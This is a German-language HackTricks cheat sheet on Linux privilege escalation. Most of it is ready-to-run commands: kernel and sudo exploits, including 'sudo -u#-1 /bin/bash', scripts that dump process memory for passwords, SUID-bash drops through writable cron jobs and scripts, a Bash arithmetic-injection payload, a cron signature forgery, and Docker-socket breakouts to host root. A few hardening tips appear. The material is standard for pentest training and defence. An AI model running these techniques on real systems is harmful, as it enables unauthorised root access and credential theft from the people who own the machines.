# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Systeminformationen

### OS-Info

Beginnen wir damit, Informationen über das laufende OS zu sammeln.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Pfad

Wenn Sie **Schreibberechtigungen für einen Ordner innerhalb der `PATH`-Variable** haben, können Sie möglicherweise hijack some libraries or binaries:
```bash
echo $PATH
```
### Umgebungsinfo

Interessante Informationen, Passwörter oder API keys in den Umgebungsvariablen?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Überprüfe die Kernel-Version und ob es einen exploit gibt, mit dem Privilegien eskaliert werden können.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Du kannst eine gute vulnerable kernel list und einige bereits **compiled exploits** hier finden: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) und [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Weitere Seiten, auf denen du einige **compiled exploits** finden kannst: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Um alle vulnerable kernel versions von dieser Seite zu extrahieren, kannst du:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools, die bei der Suche nach kernel exploits helfen können, sind:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (im victim ausführen; prüft nur exploits für kernel 2.x)

Suche immer **die kernel version in Google**, vielleicht ist deine kernel version in einem kernel exploit vermerkt und dann bist du sicher, dass dieser exploit gültig ist.

Zusätzliche kernel exploitation Techniken:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo-Version

Basierend auf den in Folgendem aufgeführten anfälligen sudo-Versionen:
```bash
searchsploit sudo
```
Sie können mit diesem grep prüfen, ob die sudo-Version verwundbar ist.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo-Versionen vor 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) erlauben unprivilegierten lokalen Benutzern, ihre Privilegien zu root zu eskalieren über die sudo `--chroot`-Option, wenn die Datei `/etc/nsswitch.conf` aus einem vom Benutzer kontrollierten Verzeichnis verwendet wird.

Hier ist ein [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot), um diese [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) auszunutzen. Bevor du den Exploit ausführst, stelle sicher, dass deine `sudo`-Version verwundbar ist und die `chroot`-Funktion unterstützt.

Für weitere Informationen, siehe das ursprüngliche [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Von @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg Signaturüberprüfung fehlgeschlagen

Siehe **smasher2 box of HTB** für ein **Beispiel**, wie diese vuln ausgenutzt werden könnte.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Weitere system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Mögliche Abwehrmaßnahmen

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Wenn du dich in einem docker container befindest, kannst du versuchen, daraus zu entkommen:


{{#ref}}
docker-security/
{{#endref}}

## Laufwerke

Überprüfe **what is mounted and unmounted**, wo und warum. Falls etwas unmounted ist, kannst du versuchen, es zu mounten und nach privaten Informationen zu suchen
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nützliche Software

Nützliche Binaries auflisten
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Überprüfe außerdem, ob **irgendein Compiler installiert ist**. Das ist nützlich, wenn du einen kernel exploit verwenden musst, da empfohlen wird, ihn auf der Maschine zu kompilieren, auf der du ihn verwenden wirst (oder auf einer ähnlichen).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Angreifbare Software installiert

Prüfe die **Version der installierten Pakete und Dienste**. Vielleicht gibt es eine alte Nagios-Version (zum Beispiel), die ausgenutzt werden könnte, um escalating privileges…\
Es wird empfohlen, die Version der verdächtigeren installierten Software manuell zu überprüfen.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Beachte, dass diese Befehle viele Informationen anzeigen werden, die größtenteils nutzlos sind. Daher empfiehlt es sich, Anwendungen wie OpenVAS oder ähnliche zu verwenden, die prüfen, ob installierte Softwareversionen für bekannte Exploits verwundbar sind._

## Prozesse

Schau dir an, **welche Prozesse** ausgeführt werden, und prüfe, ob ein Prozess **mehr Rechte hat, als er haben sollte** (vielleicht läuft ein tomcat als root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Prozessüberwachung

Du kannst Tools wie [**pspy**](https://github.com/DominicBreuker/pspy) verwenden, um Prozesse zu überwachen. Das kann sehr nützlich sein, um verwundbare Prozesse zu identifizieren, die häufig ausgeführt werden oder wenn bestimmte Voraussetzungen erfüllt sind.

### Prozessspeicher

Einige Dienste eines Servers speichern **credentials in clear text inside the memory**.\
Normalerweise benötigst du **root privileges**, um den Speicher von Prozessen zu lesen, die anderen Benutzern gehören; daher ist dies in der Regel nützlicher, wenn du bereits root bist und weitere credentials entdecken möchtest.\
Denke jedoch daran, dass **du als normaler Benutzer den Speicher der Prozesse lesen kannst, die dir gehören**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: alle Prozesse können debugged werden, solange sie dieselbe uid haben. Das ist die klassische Funktionsweise von ptrace.
> - **kernel.yama.ptrace_scope = 1**: nur ein übergeordneter Prozess kann debugged werden.
> - **kernel.yama.ptrace_scope = 2**: nur Administratoren können ptrace benutzen, da hierfür die CAP_SYS_PTRACE-Fähigkeit erforderlich ist.
> - **kernel.yama.ptrace_scope = 3**: es dürfen keine Prozesse mit ptrace getraced werden. Nach dem Setzen ist ein Reboot nötig, um ptrace wieder zu aktivieren.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Skript
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Für eine gegebene Prozess-ID zeigen **maps zeigen, wie der Speicher im virtuellen Adressraum dieses Prozesses abgebildet ist**; sie zeigt auch die **Berechtigungen jeder abgebildeten Region**. Die **mem** Pseudo-Datei **legt den eigentlichen Speicher des Prozesses offen**. Aus der **maps** Datei wissen wir, welche **Speicherbereiche lesbar** sind und deren Offsets. Wir verwenden diese Informationen, um **in die mem-Datei zu seeken und alle lesbaren Bereiche zu dumpen** in eine Datei.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` gewährt Zugriff auf den **physischen** Speicher des Systems, nicht auf den virtuellen Speicher. Der virtuelle Adressraum des Kernels ist über /dev/kmem zugänglich.\
Typischerweise ist `/dev/mem` nur für **root** und die kmem-Gruppe lesbar.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump für Linux

ProcDump ist eine für Linux neu interpretierte Version des klassischen ProcDump-Tools aus der Sysinternals-Suite für Windows. Erhältlich unter [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Werkzeuge

Um den Speicher eines Prozesses zu dumpen, können Sie Folgendes verwenden:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Sie können die root-Anforderungen manuell entfernen und den Prozess dumpen, der Ihnen gehört
- Skript A.5 aus [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root ist erforderlich)

### Zugangsdaten aus dem Prozessspeicher

#### Manuelles Beispiel

Wenn Sie feststellen, dass der authenticator-Prozess läuft:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Du kannst den process dumpen (siehe vorherige Abschnitte, um verschiedene Wege zu finden, memory eines process zu dumpen) und nach credentials im memory suchen:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Das Tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) wird **Klartext-Anmeldeinformationen aus dem Speicher stehlen** und aus einigen **bekannten Dateien**. Es benötigt Root-Rechte, um richtig zu funktionieren.

| Funktion                                          | Prozessname          |
| ------------------------------------------------- | -------------------- |
| GDM-Passwort (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktive FTP-Verbindungen)                  | vsftpd               |
| Apache2 (aktive HTTP Basic-Auth-Sitzungen)        | apache2              |
| OpenSSH (aktive SSH-Sitzungen - Sudo-Nutzung)     | sshd:                |

#### Such-Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geplante/Cron-Jobs

### Crontab UI (alseambusher) läuft als root – webbasierter Scheduler privesc

Wenn ein Web‑“Crontab UI”‑Panel (alseambusher/crontab-ui) als root läuft und nur an loopback gebunden ist, kannst du es trotzdem via SSH local port-forwarding erreichen und einen privilegierten Job erstellen, um zu eskalieren.

Typische Kette
- Entdecke loopback-only Port (z. B. 127.0.0.1:8000) und Basic-Auth realm via `ss -ntlp` / `curl -v localhost:8000`
- Finde credentials in operativen Artefakten:
  - Backups/scripts mit `zip -P <password>`
  - systemd unit mit `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel und Login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Erstelle einen high-priv job und führe ihn sofort aus (legt eine SUID shell ab):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Benutze es:
```bash
/tmp/rootshell -p   # root shell
```
Härtung
- Führe Crontab UI nicht als root aus; beschränke es auf einen dedizierten Benutzer mit minimalen Berechtigungen
- An localhost binden und zusätzlich den Zugriff über firewall/VPN einschränken; Passwörter nicht wiederverwenden
- Vermeide es, secrets in unit files einzubetten; verwende secret stores oder eine nur für root zugängliche EnvironmentFile
- Aktiviere audit/logging für On-Demand-Job-Ausführungen



Prüfe, ob eine geplante Aufgabe verwundbar ist. Vielleicht kannst du ein Script ausnutzen, das von root ausgeführt wird (wildcard vuln? kannst du Dateien ändern, die root verwendet? symlinks nutzen? spezifische Dateien in dem Verzeichnis anlegen, das root verwendet?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron-Pfad

For example, inside _/etc/crontab_ you can find the PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Beachte, dass der Benutzer "user" Schreibrechte auf /home/user hat_)

Wenn in dieser crontab der Benutzer root versucht, einen Befehl oder ein Skript auszuführen, ohne den PATH zu setzen. For example: _\* \* \* \* root overwrite.sh_\
Dann kannst du eine root-Shell erhalten, indem du Folgendes verwendest:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Wenn ein Skript, das von root ausgeführt wird, ein “**\***” innerhalb eines Befehls enthält, kannst du dies ausnutzen, um unerwartete Dinge zu erreichen (wie privesc). Beispiel:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Wenn der Wildcard einem Pfad wie** _**/some/path/\***_ **vorangeht, ist er nicht verwundbar (selbst** _**./\***_ **nicht).**

Lies die folgende Seite für weitere wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash führt parameter expansion und command substitution vor der arithmetischen Auswertung in ((...)), $((...)) und let aus. Wenn ein root cron/parser untrusted Log-Felder liest und diese in einen arithmetischen Kontext einspeist, kann ein Angreifer eine command substitution $(...) injizieren, die beim Ausführen des cron als root läuft.

- Warum es funktioniert: In Bash erfolgen Expansionen in dieser Reihenfolge: parameter/variable expansion, command substitution, arithmetic expansion, dann word splitting und pathname expansion. Ein Wert wie `$(/bin/bash -c 'id > /tmp/pwn')0` wird also zuerst substituiert (der Befehl wird ausgeführt), danach wird die verbleibende Zahl `0` für die Arithmetik verwendet, sodass das Skript ohne Fehler weiterläuft.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Schreibe vom Angreifer kontrollierten Text in das geparste Log, sodass das numerisch aussehende Feld eine command substitution enthält und mit einer Ziffer endet. Stelle sicher, dass dein Befehl nichts auf stdout schreibt (oder leite die Ausgabe um), damit die Arithmetik gültig bleibt.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Wenn das von root ausgeführte Script ein **Verzeichnis verwendet, auf das du vollen Zugriff hast**, kann es hilfreich sein, dieses Verzeichnis zu löschen und ein **symlink-Verzeichnis zu einem anderen zu erstellen**, das ein von dir kontrolliertes Script bereitstellt.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Benutzerdefiniert signierte cron-Binaries mit beschreibbaren Payloads
Blue teams signieren manchmal cron-getriebene Binaries, indem sie eine benutzerdefinierte ELF-Section ausgeben und nach einem Vendor-String grep'en, bevor sie sie als root ausführen. Wenn dieses Binary group-writable ist (z. B. `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) und du das signing material leakst, kannst du die Section fälschen und die cron-Aufgabe kapern:

1. Verwende `pspy`, um den Verifizierungsablauf zu erfassen. In Era führte root `objcopy --dump-section .text_sig=text_sig_section.bin monitor` gefolgt von `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` aus und führte dann die Datei aus.
2. Rekreiere das erwartete Zertifikat mit dem leaked key/config (aus `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Baue einen bösartigen Ersatz (z. B. eine SUID bash ablegen, deinen SSH-Schlüssel hinzufügen) und bette das Zertifikat in `.text_sig` ein, sodass der grep besteht:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Überschreibe das geplante Binary und erhalte dabei die Ausführungsbits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Warte auf den nächsten cron-Durchlauf; sobald die naive Signaturprüfung erfolgreich ist, läuft dein Payload als root.

### Häufige cron-Jobs

Du kannst Prozesse überwachen, um Prozesse zu finden, die alle 1, 2 oder 5 Minuten ausgeführt werden. Vielleicht kannst du das ausnutzen und Privilegien eskalieren.

Zum Beispiel, um **alle 0,1s für 1 Minute zu überwachen**, **nach weniger ausgeführten Befehlen zu sortieren** und die Befehle zu löschen, die am häufigsten ausgeführt wurden, kannst du Folgendes tun:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Sie können auch** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (dies überwacht und listet jeden gestarteten Prozess).

### Unsichtbare cron jobs

Es ist möglich, einen cronjob zu erstellen, indem man **einen Carriage Return nach einem Kommentar setzt** (ohne Newline-Zeichen), und der cron job wird funktionieren. Beispiel (achte auf das Carriage-Return-Zeichen):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Dienste

### Beschreibbare _.service_ Dateien

Prüfe, ob du irgendeine `.service` Datei schreiben kannst; wenn ja, **kannst du sie ändern**, sodass sie **deine Backdoor ausführt, wenn** der Service **gestartet**, **neu gestartet** oder **gestoppt** wird (vielleicht musst du warten, bis die Maschine neu gebootet wird).\
Zum Beispiel erstelle deine Backdoor innerhalb der .service Datei mit **`ExecStart=/tmp/script.sh`**

### Beschreibbare Service-Binaries

Beachte, dass wenn du **Schreibrechte für Binärdateien, die von Services ausgeführt werden** hast, du diese ändern kannst, um Backdoors einzubauen, sodass beim erneuten Ausführen der Services die Backdoors ausgeführt werden.

### systemd PATH - relative Pfade

Du kannst den von **systemd** verwendeten PATH mit:
```bash
systemctl show-environment
```
Wenn du feststellst, dass du in einem der Ordner des Pfads **schreiben** kannst, könntest du möglicherweise **escalate privileges**. Du musst nach **relativen Pfaden suchen, die in Service-Konfigurationsdateien verwendet werden**, wie zum Beispiel:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Erstelle dann ein **executable** mit dem **same name as the relative path binary** im systemd PATH-Ordner, in den du schreiben kannst, und wenn der Service aufgefordert wird, die verwundbare Aktion (**Start**, **Stop**, **Reload**) auszuführen, wird deine **backdoor** ausgeführt (nicht-privilegierte Benutzer können Services normalerweise nicht starten/stoppen, prüfe aber, ob du `sudo -l` verwenden kannst).

**Erfahre mehr über Dienste mit `man systemd.service`.**

## **Timers**

**Timers** sind systemd Unit-Dateien, deren Name auf `**.timer**` endet und die `**.service**` Dateien oder Events steuern. **Timers** können als Alternative zu cron verwendet werden, da sie eingebaute Unterstützung für kalenderbasierte Zeitereignisse und monotone Zeitereignisse bieten und asynchron ausgeführt werden können.

Du kannst alle Timer mit folgendem Befehl auflisten:
```bash
systemctl list-timers --all
```
### Schreibbare Timer

Wenn du einen Timer verändern kannst, kannst du ihn dazu bringen, einige vorhandene systemd.unit-Einheiten auszuführen (wie eine `.service` oder eine `.target`).
```bash
Unit=backdoor.service
```
In der Dokumentation kannst du lesen, was die Unit ist:

> Die Unit, die aktiviert wird, wenn dieser Timer abläuft. Das Argument ist ein Unit-Name, dessen Suffix nicht ".timer" ist. Falls nicht angegeben, ist dieser Wert standardmäßig ein Service, der denselben Namen wie die timer-Unit trägt, abgesehen vom Suffix. (Siehe oben.) Es wird empfohlen, dass der zu aktivierende Unit-Name und der Unit-Name der timer-Unit identisch benannt sind, abgesehen vom Suffix.

Daher müsstest du, um diese Berechtigung auszunutzen, Folgendes tun:

- Finde irgendeine systemd Unit (wie eine `.service`), die ein **schreibbares Binary ausführt**
- Finde irgendeine systemd Unit, die einen **relativen Pfad ausführt** und über die du **Schreibrechte** auf den **systemd PATH** hast (um das ausführbare Programm zu imitieren)

**Mehr über Timer erfährst du mit `man systemd.timer`.**

### **Timer aktivieren**

Um einen Timer zu aktivieren brauchst du root-Rechte und musst folgendes ausführen:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Beachte, dass der **timer** durch Erstellen eines Symlinks zu ihm unter `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` **aktiviert** wird.

## Sockets

Unix Domain Sockets (UDS) ermöglichen die **Kommunikation zwischen Prozessen** auf derselben oder unterschiedlichen Maschinen in Client-Server-Modellen. Sie verwenden standardmäßige Unix-Deskriptor-Dateien für die Kommunikation zwischen Rechnern und werden über `.socket`-Dateien eingerichtet.

Sockets können mit `.socket`-Dateien konfiguriert werden.

**Erfahre mehr über Sockets mit `man systemd.socket`.** In dieser Datei können mehrere interessante Parameter konfiguriert werden:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Diese Optionen unterscheiden sich, aber zusammenfassend werden sie verwendet, um **anzugeben, wo gelauscht werden soll** (der Pfad der AF_UNIX-Socket-Datei, die IPv4/6-Adresse und/oder Portnummer, auf die gelauscht wird, etc.).
- `Accept`: Nimmt ein boolesches Argument. Wenn **true**, wird für jede eingehende Verbindung eine **service**-Instanz gestartet und nur das Verbindungssocket an diese übergeben. Wenn **false**, werden alle Listening-Sockets selbst an die gestartete service unit übergeben, und es wird nur eine service unit für alle Verbindungen gestartet. Dieser Wert wird für Datagram-Sockets und FIFOs ignoriert, wo eine einzelne service unit bedingungslos den gesamten eingehenden Traffic behandelt. **Standardmäßig false**. Aus Performance-Gründen wird empfohlen, neue Daemons so zu schreiben, dass sie für `Accept=no` geeignet sind.
- `ExecStartPre`, `ExecStartPost`: Nimmt eine oder mehrere Befehlszeilen, die **jeweils vor** bzw. **nach** der Erstellung und Bindung der Listening-**Sockets**/FIFOs ausgeführt werden. Das erste Token der Befehlszeile muss ein absoluter Dateiname sein, gefolgt von Argumenten für den Prozess.
- `ExecStopPre`, `ExecStopPost`: Zusätzliche **Befehle**, die **jeweils vor** bzw. **nach** dem Schließen und Entfernen der Listening-**Sockets**/FIFOs ausgeführt werden.
- `Service`: Gibt den Namen der **service**-Unit an, die bei **eingehendem Traffic** aktiviert wird. Diese Einstellung ist nur für Sockets mit Accept=no erlaubt. Standardmäßig ist es die Service-Unit, die denselben Namen wie die Socket trägt (mit ersetztem Suffix). In den meisten Fällen sollte es nicht nötig sein, diese Option zu verwenden.

### Schreibbare .socket-Dateien

Wenn du eine **beschreibbare** `.socket`-Datei findest, kannst du am Anfang des `[Socket]`-Abschnitts etwas wie `ExecStartPre=/home/kali/sys/backdoor` **hinzufügen**, und die Backdoor wird ausgeführt, bevor die Socket erstellt wird. Daher musst du **wahrscheinlich warten, bis die Maschine neu gestartet wird.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Schreibbare Sockets

Wenn du eine **schreibbare Socket** identifizierst (_hier sprechen wir von Unix-Sockets und nicht von den Konfigurations-`.socket`-Dateien_), dann **kannst du mit dieser Socket kommunizieren** und möglicherweise eine Schwachstelle ausnutzen.

### Unix Sockets auflisten
```bash
netstat -a -p --unix
```
### Rohverbindung
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Beachte, dass es möglicherweise einige **sockets listening for HTTP** requests gibt (_ich spreche nicht von .socket files, sondern von Dateien, die als unix sockets fungieren_). Du kannst das mit folgendem Befehl überprüfen:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
If der socket **auf eine HTTP-Anfrage antwortet**, dann kannst du **mit ihm kommunizieren** und vielleicht **eine vulnerability exploitieren**.

### Beschreibbarer Docker Socket

Der Docker socket, häufig zu finden unter `/var/run/docker.sock`, ist eine kritische Datei, die gesichert werden sollte. Standardmäßig ist er für den `root`-User und Mitglieder der `docker`-Gruppe schreibbar. Possessing write access to this socket kann zu privilege escalation führen. Hier ist eine Aufschlüsselung, wie das gemacht werden kann und alternative Methoden, falls die Docker CLI nicht verfügbar ist.

#### **Privilege Escalation mit Docker CLI**

Wenn du write access auf den Docker socket hast, kannst du escalate privileges, indem du die folgenden Befehle ausführst:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Diese Befehle ermöglichen es, einen Container mit Root-Zugriff auf das Dateisystem des Hosts auszuführen.

#### **Direkte Verwendung der Docker API**

